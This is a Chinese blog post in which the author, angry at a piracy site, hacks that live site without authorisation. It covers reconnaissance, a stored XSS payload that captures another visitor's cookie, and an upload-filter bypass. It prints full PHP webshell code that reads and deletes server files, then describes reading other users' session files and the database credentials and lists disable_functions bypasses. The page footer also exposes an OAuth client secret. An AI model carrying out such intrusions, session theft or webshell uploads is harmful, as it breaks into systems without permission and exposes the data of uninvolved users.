
<!DOCTYPE html>
<html lang="">


<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020"/>
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="google-site-verification" content="-D9Uisj3xTi8Bv3Psr7gf3qKRfGei6v4_hyvxwWprC0" />
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="Burpsuite,SQLMap,文件上传," />
  

  
    <meta name="description" content="被伪装成“知识付费”的盗版网站坑了钱之后……" />
  
  
  <link rel="icon" type="image/x-icon" href="/logo.png">
  <title>被伪装成“知识付费”的盗版网站坑了钱之后…… [ RunningHacker ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    <img class="avatar" src="http://blog.runninghacker.cn/images/logo.png">
    <span class="title">RunningHacker</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            <li class="pure-menu-item"><a href="/" class="pure-menu-link">首页</a></li>
          
      
          
            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
          
      
          
            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">标签</a></li>
          
      
          
            <li class="pure-menu-item"><a href="/search" class="pure-menu-link">搜索</a></li>
          
      
          
            <li class="pure-menu-item"><a target="_blank" rel="noopener" href="https://0xff000000.com" class="pure-menu-link">关于</a></li>
          
      
          
            <li class="pure-menu-item"><a href="/atom.xml" class="pure-menu-link">订阅</a></li>
          
      
  </ul>
   
</nav>
  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        被伪装成“知识付费”的盗版网站坑了钱之后……
      </h1>
      <span>
        
        <time class="time" datetime="2020-08-05T13:12:34.000Z">
        2020-08-05
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLMap/" rel="tag">SQLMap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
      </span>
    </span>
      <span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>
      <span class="read">阅读耗时 24 分钟</span>
    </header>

    <div class="post-content">
      <p>最近迷上了评书，听了一个片段之后很想找到全集把故事听完，于是在网上搜索。找到了一个貌似资源很全的网站，但是“知识付费”时代，必须充会员才能获取真实的下载地址。由于找了很久都没找到这段评书的资源，于是也没多想，充了12元买了这个资源。</p>
<span id="more"></span>

<p>但是充完之后发现想要的资源下载链接是一个百度云，资源已经失效了，于是想找找反馈的入口。结果仔细一看才发现，这个网站非常不正规，虽然是通过QQ登录，但是一般网站会有独立的账号体系，而这个网站不能修改用户的信息，看起来就像是没完工的测试项目似的。</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806160535564.png" alt="image-20200806160535564"></p>
<p>而且网站中的资源非常博杂，从相声戏曲，到新媒体运营，再到编程、软件，简直应有尽有，而且全是百度云的资源，看起来像是收集的盗版的东西。大部分的资源页面包括首页推荐的热门资源中都没有任何留言，就像一幢豪华CBD大厦里面空无一人，显得异常诡异。</p>
<p>查看页面的过程中，只看到了一个站长的联系QQ，加过之后也没反应。那既然这样，还是靠自己一探究竟吧。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>俗话说知己知彼，百战不殆。在正式开始之前先收集一下目标站点的信息。不同于正规的渗透测试，目标就是这个网站，因此就从服务器IP、开放端口、域名、接口这些信息下手。</p>
<h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>首先通过域名，反查它的IP地址以及子域名信息。这里子域名查询没有啥结果，也和预想的差不多，一个坑钱的小网站应该也不会有什么其他子域。</p>
<p>这里用了Chrome的插件 hacker target 来进行简单查询：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163057871.png" alt="image-20200806163057871"></p>
<h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><p>拿到了IP地址，利用shodan初步看看开放了什么端口：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806162913629.png" alt="image-20200806162913629"></p>
<p>好家伙，有22还有3306？不过shodan向来都不太准，再用其他的工具确认一下。</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163328543.png" alt="image-20200806163328543"></p>
<p>这回发现多了个21，却没有3306了。那最后再用本机的nmap确认一下端口。</p>
<p>因为直接跑nmap 65535个端口时间太长，而且很容易被云厂商认为是扫描行为而封禁IP，所以可以用这种外围打探的方式先确定基本的端口，最后再用nmap指定端口来确定是否真的开放了。</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806164804389.png" alt="image-20200806164804389"></p>
<p>那么目前能确定的开放端口就是这些。</p>
<h3 id="组件信息"><a href="#组件信息" class="headerlink" title="组件信息"></a>组件信息</h3><p>对于开放的端口，简单识别一下，其中<code>21 - FTP</code>, <code>22 - SSH</code>, <code>80,443 - HTTP(S)</code>, <code>3306 - MySQL</code>，那剩下的8888是什么？访问一下界面，从内容看应该是宝塔面板的登录接口，但是做了相应的安全设置。</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806200632061.png" alt="image-20200806200632061"></p>
<p>回到HTTP(S)服务上来，先尝试用在线CMS识别，发现无法识别出使用的CMS，只知道用的是PHP：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201506225.png" alt="image-20200806201506225"></p>
<p>再看robots.txt文件，也没什么发现：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201628384.png" alt="image-20200806201628384"></p>
<p>那么目前判断很有可能就是自己开发的系统。而2020年用PHP开发系统，至少是基于某个框架的，因此寻找一下有没有使用框架的蛛丝马迹。很快，在未登录状态下点击发帖按钮有个登录跳转（这部分在下文详细说如何发现的）：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201941920.png" alt="image-20200806201941920"></p>
<p>咦？这熟悉的 :( 很想是thinkphp呀！</p>
<p>至此，简单的目标信息收集就结束了，总结如下：</p>
<p>目标域名：<a target="_blank" rel="noopener" href="http://www.xxx.net/">www.xxx.net</a></p>
<p>子域名：无</p>
<p>目标IP：3x.xx.xx.x1</p>
<p>开放端口：21，22，80，443，3306，8888</p>
<p>CMS信息：暂无</p>
<p>使用语言：PHP</p>
<p>使用框架：ThinkPHP（目前版本未知）</p>
<p>部署环境：宝塔Linux面板</p>
<h2 id="威胁建模-漏洞分析"><a href="#威胁建模-漏洞分析" class="headerlink" title="威胁建模/漏洞分析"></a>威胁建模/漏洞分析</h2><p>由于是纯黑盒测试，因此不可能有完整的威胁建模进行漏洞分析，只能根据前期收集的信息结合挖洞的过程来慢慢进行威胁建模的部分，因此这两块是合在一起进行的。</p>
<p>首先根据信息收集的内容，可以知道21和22两个端口大概率是宝塔面板提供的，为了方便用户对网站进行管理。因此这里就不去尝试暴力破解了（印象中宝塔是不允许设置弱密码的），如果Web应用的部分无法突破再考虑端口的暴力破解。同理3306也是这样。</p>
<p>8888端口是宝塔的控制面板，因为安全策略无法直接使用。因此将注意力放在443端口的Web Appication上。</p>
<h3 id="HTML-JS分析"><a href="#HTML-JS分析" class="headerlink" title="HTML/JS分析"></a>HTML/JS分析</h3><p>很多情况下，在HTML源码和JS脚本中可能会隐藏诸多秘密，尤其是在目前前端开发喜欢用VUE.js，网站的页面路径很多都会在JS里暴露。</p>
<p>首先先看首页的HTML源码以及加载的非第三方JS代码。在首页的HTML源码中，发现了一段被注释掉的导航栏代码：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205311823.png" alt="image-20200806205311823"></p>
<p>试一下<code>/taolun</code>，看看还有没有这个页面：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205618250.png" alt="image-20200806205618250"></p>
<p>看到这个讨论区，很多都是在吐槽链接失效、资源付费后没用的帖子，难怪要把这个导航栏给注释掉！</p>
<p>在页面右下角有一个发新帖的按钮，由于是未登录状态，因此点击之后弹出跳转登录的错误页面（即信息收集里看到的 :( 的页面），确定目标使用的框架是Thinkphp。</p>
<p>看了其他页面的HTML和JS，没有其他有价值的内容了。</p>
<h3 id="ThinkPHP已知漏洞"><a href="#ThinkPHP已知漏洞" class="headerlink" title="ThinkPHP已知漏洞"></a>ThinkPHP已知漏洞</h3><p>既然确定了框架是TP，那么可以试试已知漏洞，万一有呢~</p>
<p>可以利用<a target="_blank" rel="noopener" href="https://github.com/theLSA/tp5-getshell/%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%E3%80%82">https://github.com/theLSA/tp5-getshell/工具来方便的进行检测。</a></p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806211806612.png" alt="image-20200806211806612"></p>
<p>这里显示三个PoC均为404，可能是路由配置与默认有差距。这里可以执行其他的用例，比如_method变量覆盖漏洞（可参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/WindrunnerMax/p/12558256.html">《ThinkPHP5.0 漏洞测试》</a>）：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806212306138.png" alt="image-20200806212306138"></p>
<p>这里成功让系统报错，再次确认确实是TP的框架，版本V5.0.0，以及绝对路径等等，这里就不再详细展示。</p>
<p>测试了其他的已知漏洞，都未能成功触发，此路不通。</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>因为用的是TP的框架，因此这里实际上也算是已知漏洞的验证了。因为TP自带防护，而且测试了几个点发现SQL防护应该是打开的，而某些注入是需要特定条件（比如把input变量直接转成数组），因为没有源码，试了几个点都没成功就放弃了&gt;.&lt; …</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS在这里其实没太大作用，整个网站都没找到有与后台的联系，比如问题反馈什么的，不确定管理员是否会去查看，不过抱着试一试的心情，开始找输入点。</p>
<p>依然还是在<code>/taolun</code>的页面下，找了个帖子进去，发现可以回帖。本着先试试水的心态，复制了这个帖子的标题进去，发现竟然编辑器支持样式！</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806213651303.png" alt="image-20200806213651303"></p>
<p>那这就说明，很有可能这个接口根本不会对输入进行过滤！</p>
<p>迅速打开XSS平台，将代码复制下来，用Burpsuite拦住消息，在结尾插入代码，搞定！</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214055993.png" alt="image-20200806214055993"></p>
<p>先试试我自己：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214330841.png" alt="image-20200806214330841"></p>
<p>成功读到了我的Cookie。</p>
<p>但是因为并没有注意邮件，实际上很快就有人看了这个帖子触发了XSS，但等我看到的时候已经失效了……</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>因为XSS的成功，我判断目标站点应该是除了框架默认的安全配置之外并没有进行额外的安全加固。在“发新帖”的部分，允许用户在帖子里上传图片：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806215141784.png" alt="image-20200806215141784"></p>
<p>这就给了我机会了。先试试简单的，编辑一个文本文件，内容是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure>

<p>文件名保存成<code>1.jpg</code>。上传的时候用Burp将filename的后缀改成.php：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222704821.png" alt="image-20200806222704821"></p>
<p>浏览器访问成功：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222905548.png" alt="image-20200806222905548"></p>
<p>利用这个页面，正好查看一下disable_functions的情况：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222955099.png" alt="image-20200806222955099"></p>
<p>这里可以看到，应该是宝塔面板的设置，在配置里将所有可能命令执行的函数全部都禁用了，因此上传Webshell也没什么意义，没法用菜刀或者AntSword进行连接。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上面的步骤试探到文件上传，就已经找到了相应的方法可以进行利用了。本来的想法是通过文件上传进行反弹Shell，进一步提权进行后渗透的步骤，但是这里因为<code>disable_functions</code>卡住，需要绕过。</p>
<p>在实施绕过这个步骤之前，可以考虑先利用一下3306端口。之前发现3306是开放的，目前又可以上传PHP源码，可以写一个读取文件的PHP代码，将TP的database.php读出来，获取到数据库用户名和密码从而进行连接。</p>
<p>同时，为了保证之前的phpinfo页面不被其他人发现，写了一个删除文件功能（如果后面不用了还能把上传的这些PHP都删了）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;dir&quot;</span>];</span><br><span class="line"><span class="variable">$del</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;del&quot;</span>];</span><br><span class="line"><span class="variable">$read</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;read&quot;</span>];</span><br><span class="line"><span class="variable">$fname</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$del</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span>(unlink(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$read</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=fopen(<span class="variable">$dir</span>.<span class="variable">$fname</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> fread(<span class="variable">$handler</span>, filesize(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">	fclose(<span class="variable">$handler</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dir</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=opendir(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">while</span>((<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	closedir(<span class="variable">$handler</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$fn</span>)&#123;</span><br><span class="line">		<span class="variable">$mark</span>=<span class="string">&quot; &quot;</span>;<span class="keyword">if</span>(is_dir(<span class="variable">$dir</span>.<span class="variable">$fn</span>)) <span class="variable">$mark</span>=<span class="string">&quot;+&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$mark</span> . <span class="variable">$fn</span> . <span class="string">&quot; &quot;</span> . @filesize(<span class="variable">$dir</span>.<span class="variable">$fn</span>) .<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实功能很简单，就是列出目录、读取文件、删除文件。</p>
<h3 id="查看Session文件"><a href="#查看Session文件" class="headerlink" title="查看Session文件"></a>查看Session文件</h3><p>忽然想到，之前XSS累死累活，不就是想搞一个SessionID嘛，这都进来了不就可以直接看了？一般情况下，Session文件是存放在<code>/tmp</code>目录下的，PHP默认是以<code>sess_</code>开头的文件名。</p>
<p>先用之前上传的脚本试一下：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224057289.png" alt="image-20200806224057289"></p>
<p>Bingo！确实在这里。Response中文件名后面的数字是文件大小，超时的Session文件中的数据会被删除，因此大小是 0 。</p>
<p>那找一个大小不为0的，看看内容：</p>
<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224332843.png" alt="image-20200806224332843"></p>
<h3 id="查看数据库配置"><a href="#查看数据库配置" class="headerlink" title="查看数据库配置"></a>查看数据库配置</h3><p>同理，通过前面phpinfo中的绝对路径，可以构建../来进入<code>application</code>文件夹，读取<code>database.php</code>文件，获取MySQL用户名密码。</p>
<p>考虑到宝塔启动MySQL用的是低权限账户，且数据库中的数据目前并没有什么用，还可能又风险，想了想还是不去弄了，反正是个思路。</p>
<h3 id="突破disable-functions"><a href="#突破disable-functions" class="headerlink" title="突破disable_functions"></a>突破disable_functions</h3><p>没有命令执行的WebShell是没有太大的利用价值的，这里想突破一下disable_functions。</p>
<p>突破的方法有很多，大致总结如下：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>PHP版本</th>
<th>条件</th>
</tr>
</thead>
<tbody><tr>
<td>寻找未禁用函数</td>
<td>任意</td>
<td>disable_functions中没有禁用某些函数</td>
</tr>
<tr>
<td>LD_PRELOAD劫持</td>
<td>任意</td>
<td>Linux环境，putenv()、mail()函数可用</td>
</tr>
<tr>
<td>ShellShock绕过</td>
<td>5.*</td>
<td>目标OS有CVE-2014-6271，Linux环境，putenv()、mail()函数可用</td>
</tr>
<tr>
<td>imap_open任意命令执行</td>
<td>任意</td>
<td>开启imap扩展，并支持imap_open()函数</td>
</tr>
<tr>
<td>Apache+mod_cgi+.htaccess绕过</td>
<td>任意</td>
<td>Apache，启用mod-cgi，允许.htaccess且文件可写</td>
</tr>
<tr>
<td>ImageMagick漏洞绕过</td>
<td>&gt;=5.4</td>
<td>开启ImageMagick插件且插件版本&lt;= 3.3.0</td>
</tr>
<tr>
<td>FFI外部函数接口绕过</td>
<td>7.4</td>
<td>ffi.enable=true</td>
</tr>
</tbody></table>
<p>从目标环境来看，disable_functions已经禁用全部可能利用的函数，导致不满足全部的利用条件。</p>

    </div>

    <div>全文完。</div>
  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="toc-text">域名信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-text">端口信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-text">组件信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">威胁建模&#x2F;漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-JS%E5%88%86%E6%9E%90"><span class="toc-text">HTML&#x2F;JS分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">ThinkPHP已知漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BSession%E6%96%87%E4%BB%B6"><span class="toc-text">查看Session文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE"><span class="toc-text">查看数据库配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4disable-functions"><span class="toc-text">突破disable_functions</span></a></li></ol></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>

  <div id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
<script src="https://priesttomb.github.io/js/md5.min.js"></script>
<script type="text/javascript">
    new Gitalk({
        cientID: 'b1ea9aed8ae674a0fde6',
        clientSecret: '71732aecef18eed31b024304a88ce7bc77a28f6f',
        owner: 'mactavishmeng',
        admin: 'mactavishmeng',
        repo: 'mactavishmeng.github.io',
        id: md5(location.pathname),
        distractionFreeMode: true
    }).render('gitalk-container')
</script>

<div class="share" style="width: 100%;">
  
</div>

  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2020/07/14/XSS%E6%B5%8B%E8%AF%95%E5%BF%83%E5%BE%97/" rel="next" title="从防护视角谈XSS的成因、绕过和防御">
          从防护视角谈XSS的成因、绕过和防御
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" rel="prev" title="校园生活APP渗透记录">
            校园生活APP渗透记录
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <a class="bottom-item" target="_blank" rel="noopener" href="https://blog.0xff000000.com">首页</a> |
        <a class="bottom-item" href="https://0xff000000.com" target="_blank">主站</a> |
        <a class="bottom-item" href="https://github.com/KevinOfNeu" target="_blank">GitHub</a> |
        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
    </div>
</footer>
  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



</body>
</html>
